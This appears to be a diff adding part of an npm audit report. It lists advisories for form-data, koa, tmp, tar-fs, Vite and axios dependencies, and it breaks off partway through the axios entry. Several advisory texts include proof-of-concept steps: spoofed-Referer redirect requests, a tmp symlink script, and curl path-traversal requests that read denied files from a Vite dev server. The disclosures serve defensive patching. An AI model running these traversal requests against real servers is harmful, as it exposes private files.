+      "overview": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+      "reported_by": null,
+      "title": "form-data uses unsafe random function in form-data for choosing boundary",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-7783"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "form-data",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-fjxv-7rqg-78g4",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2025-07-21T19:04:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-330"
+      ],
+      "url": "https://github.com/advisories/GHSA-fjxv-7rqg-78g4"
+    },
+    "1106509": {
+      "findings": [
+        {
+          "version": "2.5.1",
+          "paths": [
+            "packages__logging__newrelic>newrelic>@newrelic/security-agent>sync-request>then-request>form-data"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4",
+      "created": "2025-07-21T19:04:54.000Z",
+      "id": 1106509,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+      "reported_by": null,
+      "title": "form-data uses unsafe random function in form-data for choosing boundary",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-7783"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "form-data",
+      "vulnerable_versions": "<2.5.4",
+      "github_advisory_id": "GHSA-fjxv-7rqg-78g4",
+      "recommendation": "Upgrade to version 2.5.4 or later",
+      "patched_versions": ">=2.5.4",
+      "updated": "2025-07-21T19:04:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-330"
+      ],
+      "url": "https://github.com/advisories/GHSA-fjxv-7rqg-78g4"
+    },
+    "1106835": {
+      "findings": [
+        {
+          "version": "2.15.3",
+          "paths": [
+            "packages__lone-star-platform>koa"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/koajs/koa/security/advisories/GHSA-jgmv-j7ww-jx2x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54420\n- https://github.com/koajs/koa/issues/1892\n- https://github.com/koajs/koa/issues/1892#issue-3213028583\n- https://github.com/koajs/koa/commit/422c551c63d00f24e2bbbdf492f262a5935bb1f0\n- https://vuldb.com/?ctiid.317514\n- https://vuldb.com/?id.317514\n- https://vuldb.com/?submit.619741\n- https://github.com/advisories/GHSA-jgmv-j7ww-jx2x",
+      "created": "2025-07-29T19:11:25.000Z",
+      "id": 1106835,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nIn the latest version of Koa, the back method used for redirect operations adopts an insecure implementation, which uses the user-controllable referrer header as the redirect target.\n\n## Details\non the API document https://www.koajs.net/api/response#responseredirecturl-alt, we can see:\n\n**response.redirect(url, [alt])**\n```\nPerforms a [302] redirect to url.\nThe string \"back\" is specially provided for Referrer support, using alt or \"/\" when Referrer does not exist.\n\nctx.redirect('back');\nctx.redirect('back', '/index.html');\nctx.redirect('/login');\nctx.redirect('http://google.com');\n\n```\nhowever, the \"back\" method is insecure:\n\n- https://github.com/koajs/koa/blob/master/lib/response.js#L322\n```\n  back (alt) {\n    const url = this.ctx.get('Referrer') || alt || '/'\n    this.redirect(url)\n  },\n```\nReferrer Header is User-Controlled.\n\n\n## PoC\n\n**there is a demo for POC:**\n```\nconst Koa = require('koa')\nconst serve = require('koa-static')\nconst Router = require('@koa/router')\nconst path = require('path')\n\nconst app = new Koa()\nconst router = new Router()\n\n// Serve static files from the public directory\napp.use(serve(path.join(__dirname, 'public')))\n\n// Define routes\nrouter.get('/test', ctx => {\n  ctx.redirect('back', '/index1.html')\n})\n\nrouter.get('/test2', ctx => {\n  ctx.redirect('back')\n})\n\nrouter.get('/', ctx => {\n  ctx.body = 'Welcome to the home page! Try accessing /test, /test2'\n})\n\napp.use(router.routes())\napp.use(router.allowedMethods())\n\nconst port = 3000\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`)\n}) \n```\n**Proof Of Concept**\n```\nGET /test HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n\n\nGET /test2 HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n```\n![image](https://github.com/user-attachments/assets/03d1e61b-df97-4b42-a0c4-437bd17144db)\n\n![image](https://github.com/user-attachments/assets/f4e076e0-3853-4b7a-b4c0-bddf5b67631a)\n\n\n## Impact\nhttps://learn.snyk.io/lesson/open-redirect/",
+      "reported_by": null,
+      "title": "Koa Open Redirect via Referrer Header (User-Controlled)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-8129"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "koa",
+      "vulnerable_versions": ">=2.0.0 <2.16.2",
+      "github_advisory_id": "GHSA-jgmv-j7ww-jx2x",
+      "recommendation": "Upgrade to version 2.16.2 or later",
+      "patched_versions": ">=2.16.2",
+      "updated": "2025-08-05T07:01:04.000Z",
+      "cvss": {
+        "score": 3.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-jgmv-j7ww-jx2x"
+    },
+    "1106849": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>inquirer>external-editor>tmp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+      "created": "2025-08-06T17:06:04.000Z",
+      "id": 1106849,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "reported_by": null,
+      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-54798"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tmp",
+      "vulnerable_versions": "<=0.2.3",
+      "github_advisory_id": "GHSA-52f5-9888-hmc6",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2025-08-07T15:11:23.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+    },
+    "1106930": {
+      "findings": [
+        {
+          "version": "2.1.1",
+          "paths": [
+            "packages__lone-star-platform>@newrelic/native-metrics>prebuildify>tar-fs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48387\n- https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f\n- https://github.com/google/security-research/security/advisories/GHSA-xrg4-qp5w-2c3w\n- https://github.com/advisories/GHSA-8cj5-5rvv-wf4v",
+      "created": "2025-06-03T06:14:25.000Z",
+      "id": 1106930,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n v3.0.8, v2.1.2, v1.16.4 and below\n\n### Patches\nHas been patched in 3.0.9, 2.1.3, and 1.16.5\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nThank you Caleb Brown from Google Open Source Security Team for reporting this in detail.",
+      "reported_by": null,
+      "title": "tar-fs can extract outside the specified dir with a specific tarball",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48387"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar-fs",
+      "vulnerable_versions": ">=2.0.0 <2.1.3",
+      "github_advisory_id": "GHSA-8cj5-5rvv-wf4v",
+      "recommendation": "Upgrade to version 2.1.3 or later",
+      "patched_versions": ">=2.1.3",
+      "updated": "2025-08-14T19:26:17.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"
+    },
+    "1107324": {
+      "findings": [
+        {
+          "version": "6.3.5",
+          "paths": [
+            "packages__storage__sqlite-ops>vitest>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58751\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb\n- https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d\n- https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069\n- https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec\n- https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0\n- https://github.com/advisories/GHSA-g4jq-h2w9-997c",
+      "created": "2025-09-09T20:55:56.000Z",
+      "id": 1107324,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",
+      "reported_by": null,
+      "title": "Vite middleware may serve files starting with the same name with the public directory",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-58751"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=6.0.0 <=6.3.5",
+      "github_advisory_id": "GHSA-g4jq-h2w9-997c",
+      "recommendation": "Upgrade to version 6.3.6 or later",
+      "patched_versions": ">=6.3.6",
+      "updated": "2025-09-09T20:55:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-g4jq-h2w9-997c"
+    },
+    "1107328": {
+      "findings": [
+        {
+          "version": "6.3.5",
+          "paths": [
+            "packages__storage__sqlite-ops>vitest>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58752\n- https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f\n- https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e\n- https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea\n- https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6\n- https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md\n- https://github.com/advisories/GHSA-jqfw-vq24-v9c3",
+      "created": "2025-09-09T20:54:42.000Z",
+      "id": 1107328,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
+      "reported_by": null,
+      "title": "Vite's `server.fs` settings were not applied to HTML files",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-58752"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=6.0.0 <=6.3.5",
+      "github_advisory_id": "GHSA-jqfw-vq24-v9c3",
+      "recommendation": "Upgrade to version 6.3.6 or later",
+      "patched_versions": ">=6.3.6",
+      "updated": "2025-09-09T20:54:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-23",
+        "CWE-200",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqfw-vq24-v9c3"
+    },
+    "1107599": {
+      "findings": [
+        {
+          "version": "1.7.7",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>axios"
+          ]
+        },
+        {
+          "version": "1.7.4",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>axios"
+          ]
+        },
+        {
+          "version": "1.7.5",
+          "paths": [
+            "packages__lone-star-platform>axios"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj\n- https://github.com/axios/axios/pull/7011\n- https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593\n- https://github.com/axios/axios/releases/tag/v1.12.0\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58754\n- https://github.com/advisories/GHSA-4hjh-wcwx-xvwj",
+      "created": "2025-09-11T21:07:55.000Z",
+      "id": 1107599,
+      "npm_advisory_id": null,
